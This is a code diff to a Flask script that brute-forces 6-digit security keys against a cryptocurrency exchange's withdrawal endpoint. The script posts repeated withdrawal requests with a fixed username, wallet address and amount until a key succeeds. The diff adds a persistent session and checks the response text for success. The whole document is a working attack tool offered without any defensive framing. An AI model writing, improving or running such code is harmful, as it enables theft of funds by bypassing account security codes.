@@ -1,7 +1,7 @@
 import logging
+import requests
 from flask import Flask, jsonify
 import itertools
-import requests
 
 # === Flask App Initialization ===
 app = Flask(__name__)
@@ -23,7 +23,7 @@ logging.basicConfig(
 logger = logging.getLogger()
 
 # === Function: Attempt a Withdrawal ===
-def attempt_withdrawal(security_key):
+def attempt_withdrawal(security_key, session):
     logger.debug(f"Trying security key: {security_key}")
     data = {
         'username': USERNAME,
@@ -35,18 +35,22 @@ def attempt_withdrawal(security_key):
     }
 
     try:
-        response = requests.post(WITHDRAWAL_URL, data=data)
+        response = session.post(WITHDRAWAL_URL, data=data, allow_redirects=True)
 
-        if response.status_code == 200:
+        # Check for success in response content
+        if 'success' in response.text.lower():
             logger.info(f"✅ SUCCESS: Withdrawal initiated with key: {security_key}")
-        else:
+            return True
+        elif 'error' in response.text.lower() or response.status_code == 302:
             logger.warning(f"❌ Failed with key: {security_key} | Status: {response.status_code}")
-        
-        return response.status_code, response.text
-    
+            return False
+        else:
+            logger.warning(f"❓ Unexpected response: {response.status_code} | {response.text[:100]}")
+            return False
+
     except Exception as e:
         logger.error(f"🚨 ERROR: While trying key {security_key}: {e}")
-        return None, str(e)
+        return False
 
 # === Function: Generate 6-digit Keys ===
 def generate_security_keys():
@@ -60,12 +64,14 @@ def start_withdrawal():
     logger.info(f"🔐 Username: {USERNAME}")
     logger.info(f"💰 Withdrawal Details - Address: {WALLET_ADDRESS}, Coin: {CURRENCY}, Amount: {AMOUNT}")
 
+    session = requests.Session()  # Using a session to maintain cookies and authentication
+
     keys = generate_security_keys()
 
     for key in keys:
-        status_code, response_text = attempt_withdrawal(key)
+        success = attempt_withdrawal(key, session)
 
-        if status_code == 200:
+        if success:
             logger.info(f"🎯 Found valid key: {key}")
             return jsonify({
                 "status": "success",
